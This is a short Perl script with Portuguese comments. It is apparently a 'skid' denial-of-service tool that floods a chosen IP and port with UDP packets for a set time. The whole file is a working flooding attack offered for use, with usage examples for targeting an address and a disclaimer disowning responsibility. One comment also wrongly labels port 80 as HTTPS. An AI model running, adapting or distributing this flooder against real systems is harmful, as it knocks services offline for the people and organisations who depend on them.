#!/usr/bin/perl

#Sei lá - Por favor, não derrube sites do governo, ai já é sua responsabilidade e bom senso.
#Port - Port '80' para HTTPS (Comum para lammer) ou '53' para DNS ou '443' para HTTPS [SOURCE: INTERNET / ALL RIGHTS TO CREATOR]
#Size - Não use mais de 1500+ Pacotes
#Time - Olha, dependendo da sua conexão, ela pode cair :O 
#CANCELAR = CTRL + C
 
use Socket;
use strict;

print '
ATENÇÃO: NÃO ME RESPONSABILIZO POR ESSA MERDA!
';
print "\n";

 
if ($#ARGV != 3) {
  print "\n\t\t\t***ARGUMENTOS INVALIDOS***\n";
  print "-Ex) perl SKIDZINHODDOS.pl [IP] [PORT] [PACOTES] [SEGUNDOS]\n";
  print "-Atacando o IP '1.1.1.1' por '300' segundos no port '80' usando '1000' pacotes\n\n";
  exit(1);
}

my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Cannot connect to $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
print "~Para cancelar, aperte \'Ctrl-C\'\n\n";
print "|IP|\t\t |Port|\t\t |Size|\t\t |Time|\n";
print "|$ip|\t |$port|\t\t |$size|\t\t |$time|\n";
print "Para cancelar, aperte 'Ctrl-C'\n" unless $time;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
